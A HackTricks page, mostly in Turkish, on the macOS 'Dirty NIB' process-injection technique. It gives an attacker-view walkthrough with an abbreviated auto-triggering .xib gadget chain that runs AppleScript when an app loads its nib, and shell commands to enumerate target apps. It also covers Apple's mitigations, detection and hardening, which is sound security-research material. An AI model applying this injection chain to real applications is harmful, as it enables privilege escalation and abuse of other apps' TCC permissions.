# macOS Dirty NIB

{{#include ../../../banners/hacktricks-training.md}}

Dirty NIB, imzalı bir macOS app paketinin içindeki Interface Builder dosyaları (.xib/.nib) kötüye kullanılarak hedef süreç içinde saldırgan kontrollü mantığın çalıştırılmasına ve böylece o sürecin entitlements ve TCC izinlerinin devralınmasına işaret eder. Bu teknik ilk olarak xpn (MDSec) tarafından belgelenmiş, daha sonra Sector7 tarafından genelleştirilmiş ve önemli ölçüde genişletilmiştir; Sector7 ayrıca Apple’ın macOS 13 Ventura ve macOS 14 Sonoma’daki hafifleştirmelerini de ele almıştır. Arka plan ve detaylı incelemeler için sondaki referanslara bakın.

> Özet
> • macOS 13 Ventura öncesi: bir bundle’ın MainMenu.nib’ini (veya startup’ta yüklenen başka bir nib’i) değiştirmek genellikle process injection elde etmeye ve sıkça privilege escalation’a güvenilir şekilde ulaşmaya izin veriyordu.
> • macOS 13 (Ventura) ile başlayan ve macOS 14 (Sonoma) ile geliştirilmiş: first‑launch deep verification, bundle protection, Launch Constraints ve yeni TCC “App Management” izni, ilişkisiz uygulamaların post‑launch nib tahrifatını büyük ölçüde engelliyor. Yine de bazı niş durumlarda saldırılar mümkün olabilir (ör. aynı geliştiriciye ait tooling’in kendi uygulamalarını değiştirmesi veya kullanıcı tarafından App Management/Full Disk Access verilmiş terminaller gibi).

## What are NIB/XIB files

Nib (NeXT Interface Builder kısaltması) dosyaları, AppKit uygulamaları tarafından kullanılan serileştirilmiş UI nesne grafikleri’dir. Modern Xcode, düzenlenebilir XML .xib dosyalarını depolar ve bunlar build zamanında .nib’e derlenir. Tipik bir uygulama ana UI’sini `NSApplicationMain()` aracılığıyla yükler; bu fonksiyon app’in Info.plist’inden `NSMainNibFile` anahtarını okur ve çalışma zamanında nesne grafiğini örnekler.

Saldırıyı mümkün kılan ana noktalar:
- NIB yükleme, sınıfların NSSecureCoding’e uymasını gerektirmeden rastgele Objective‑C sınıflarını örnekler (Apple’ın nib loader’ı `initWithCoder:` mevcut olmadığında `init`/`initWithFrame:`’e geri döner).
- Cocoa Bindings, nib’ler örneklenirken yöntem çağırmak için kötüye kullanılabilir; kullanıcı etkileşimi gerektirmeyen zincirlenmiş çağrılar dahil.

## Dirty NIB injection process (attacker view)

Klasik Ventura‑öncesi akış:
1) Kötücül bir .xib oluşturun
- Bir `NSAppleScript` nesnesi ekleyin (veya `NSTask` gibi diğer “gadget” sınıflar).
- Başlığı payload içeren (ör. AppleScript veya komut argümanları) bir `NSTextField` ekleyin.
- Hedef nesne üzerinde yöntemleri çağırmak için bindings ile bağlanmış bir veya daha fazla `NSMenuItem` nesnesi ekleyin.

2) Kullanıcı tıklaması olmadan otomatik tetikleyin
- Bir menü öğesinin target/selector’ünü ayarlamak için bindings kullanın ve ardından eylemin nib yüklendiğinde otomatik olarak tetiklenmesi için özel `_corePerformAction` metodunu çağırın. Bu, bir kullanıcının butona tıklaması gerekliliğini ortadan kaldırır.

Bir .xib içinde otomatik tetik zincirinin minimal örneği (anlaşılırlık için kısaltılmış):
```xml
<objects>
<customObject id="A1" customClass="NSAppleScript"/>
<textField id="A2" title="display dialog \"PWND\""/>
<!-- Menu item that will call -initWithSource: on NSAppleScript with A2.title -->
<menuItem id="C1">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="initWithSource:"/>
<binding name="Argument" destination="A2" keyPath="title"/>
</connections>
</menuItem>
<!-- Menu item that will call -executeAndReturnError: on NSAppleScript -->
<menuItem id="C2">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="executeAndReturnError:"/>
</connections>
</menuItem>
<!-- Triggers that auto‑press the above menu items at load time -->
<menuItem id="T1"><connections><binding keyPath="_corePerformAction" destination="C1"/></connections></menuItem>
<menuItem id="T2"><connections><binding keyPath="_corePerformAction" destination="C2"/></connections></menuItem>
</objects>
```
Bu, nib yüklendiğinde hedef süreçte keyfi AppleScript yürütülmesini sağlar. Gelişmiş zincirler şunları yapabilir:
- Keyfi AppKit sınıflarını örnekleyebilir (ör. `NSTask`) ve `-launch` gibi argümansız yöntemleri çağırabilir.
- Yukarıdaki binding hilesiyle nesne argümanlı keyfi selector'leri çağırabilir.
- AppleScriptObjC.framework'i yükleyip Objective‑C'ye köprü kurabilir ve seçili C API'lerini bile çağırabilir.
- Hâlâ Python.framework içeren daha eski sistemlerde, Python'a köprü kurup `ctypes` kullanarak keyfi C fonksiyonlarını çağırabilir (Sector7'in araştırması).

3) Uygulamanın nib'ini değiştirin
- target.app'i yazılabilir bir konuma kopyalayın, örn. `Contents/Resources/MainMenu.nib` dosyasını kötü amaçlı nib ile değiştirin ve target.app'i çalıştırın. Pre‑Ventura döneminde, tek seferlik bir Gatekeeper değerlendirmesinden sonra sonraki başlatmalarda yalnızca yüzeysel imza kontrolleri yapıldığından, yürütülebilir olmayan kaynaklar (ör. .nib) yeniden doğrulanmazdı.

Görünür bir test için örnek AppleScript payload:
```applescript
set theDialogText to "PWND"
display dialog theDialogText
```
## Modern macOS protections (Ventura/Monterey/Sonoma/Sequoia)

Apple, Dirty NIB'in modern macOS'ta geçerliliğini önemli ölçüde azaltan birkaç sistemsel hafifletme getirdi:
- First‑launch deep verification and bundle protection (macOS 13 Ventura)
- Herhangi bir uygulamanın ilk çalıştırılmasında (quarantined or not), derin bir imza doğrulaması tüm bundle kaynaklarını kapsar. Sonrasında bundle korunur: yalnızca aynı geliştiriciden gelen uygulamalar (veya uygulama tarafından açıkça izin verilenler) içeriğini değiştirebilir. Diğer uygulamaların başka bir uygulamanın bundle'ına yazabilmesi için yeni TCC “App Management” iznine ihtiyaç vardır.
- Launch Constraints (macOS 13 Ventura)
- System/Apple‑bundled apps can’t be copied elsewhere and launched; bu, OS uygulamaları için “copy to /tmp, patch, run” yaklaşımını öldürür.
- Improvements in macOS 14 Sonoma
- Apple App Management'ı sertleştirdi ve Sector7 tarafından belirtilen bilinen bypass'ları (ör. CVE‑2023‑40450) düzeltti. Python.framework daha önce (macOS 12.3) kaldırılmıştı, bu da bazı privilege‑escalation zincirlerini kırdı.
- Gatekeeper/Quarantine changes
- Bu tekniği etkileyen Gatekeeper, provenance, ve assessment değişikliklerinin daha geniş tartışması için, aşağıda referans verilen sayfaya bakın.

> Practical implication
> • On Ventura+ you generally cannot modify a third‑party app’s .nib unless your process has App Management or is signed by the same Team ID as the target (e.g., developer tooling).
> • Granting App Management or Full Disk Access to shells/terminals effectively re‑opens this attack surface for anything that can execute code inside that terminal’s context.


### Launch Constraints'i Ele Alma

Launch Constraints, Ventura ile başlayarak birçok Apple uygulamasının varsayılan olmayan konumlardan çalıştırılmasını engeller. Eğer bir Apple uygulamasını geçici bir dizine kopyalayıp, `MainMenu.nib`'i değiştirip başlatmak gibi pre‑Ventura iş akışlarına dayanıyorsanız, bunun >= 13.0'da başarısız olmasını bekleyin.


## Hedefleri ve nib'leri listeleme (araştırma / eski sistemler için faydalı)

- UI'si nib‑tabanlı uygulamaları tespit edin:
```bash
find /Applications -maxdepth 2 -name Info.plist -exec sh -c \
'for p; do if /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" >/dev/null 2>&1; \
then echo "[+] $(dirname "$p") uses NSMainNibFile=$( /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" )"; fi; done' sh {} +
```
- Bir bundle içinde aday nib kaynaklarını bul:
```bash
find target.app -type f \( -name "*.nib" -o -name "*.xib" \) -print
```
- Kod imzalarını derinlemesine doğrulayın (kaynaklarla oynadıysanız ve yeniden imzalamadıysanız başarısız olur):
```bash
codesign --verify --deep --strict --verbose=4 target.app
```
> Not: Modern macOS'ta, başka bir uygulamanın bundle'ına uygun yetki olmadan yazmaya çalıştığınızda bundle protection/TCC tarafından engellenirsiniz.

## Tespit ve DFIR ipuçları

- bundle kaynakları üzerinde dosya bütünlüğü izleme
- Yüklü uygulamalarda `Contents/Resources/*.nib` ve diğer yürütülemeyen kaynaklarda mtime/ctime değişikliklerini izleyin.
- Unified logs ve süreç davranışı
- GUI uygulamaları içinde beklenmeyen AppleScript yürütmelerini ve AppleScriptObjC veya Python.framework yükleyen süreçleri izleyin. Örnek:
```bash
log stream --info --predicate 'processImagePath CONTAINS[cd] ".app/Contents/MacOS/" AND (eventMessage CONTAINS[cd] "AppleScript" OR eventMessage CONTAINS[cd] "loadAppleScriptObjectiveCScripts")'
```
- Proaktif değerlendirmeler
- Kritik uygulamalar üzerinde `codesign --verify --deep` komutunu periyodik olarak çalıştırarak kaynakların sağlam kaldığından emin olun.
- Yetki bağlamı
- TCC “App Management” veya Full Disk Access hakkına kimlerin/neyin sahip olduğunu denetleyin (özellikle terminaller ve yönetim ajanları). Genel‑amaç shell'lerden bunları kaldırmak, Dirty NIB‑stilindeki manipülasyonların kolayca yeniden etkinleştirilmesini engeller.


## Savunma sertleştirmesi (geliştiriciler ve savunucular)

- Programatik UI tercih edin veya nib'lerden instantiated edilen öğeleri sınırlayın. nib grafiğine güçlü sınıfları (ör. `NSTask`) dahil etmekten kaçının ve rastgele nesneler üzerinde dolaylı olarak selector çağıran bindings'ten kaçının.
- Library Validation ile hardened runtime'ı benimseyin (modern uygulamalar için zaten standart). Bu tek başına nib enjeksiyonunu durdurmasa da kolay native kod yüklemeyi engeller ve saldırganları sadece scripting‑tabanlı payload'lara zorlar.
- Genel‑amaç araçlarda geniş App Management izinleri talep etmeyin veya bunlara bağlı olmayın. Eğer MDM App Management gerektiriyorsa, bu bağlamı kullanıcı tarafından başlatılan shell'lerden ayırın.
- Uygulama bundle'ınızın bütünlüğünü düzenli olarak doğrulayın ve güncelleme mekanizmalarınızı bundle kaynaklarını otomatik olarak onaran şekilde tasarlayın.


## Related reading in HackTricks

Learn more about Gatekeeper, quarantine and provenance changes that affect this technique:

{{#ref}}
../macos-security-protections/macos-gatekeeper.md
{{#endref}}


## References

- xpn – DirtyNIB (orijinal yazı, Pages örneğiyle): https://blog.xpnsec.com/dirtynib/
- Sector7 – Bringing process injection into view(s): exploiting all macOS apps using nib files (5 Nisan 2024): https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/

{{#include ../../../banners/hacktricks-training.md}}
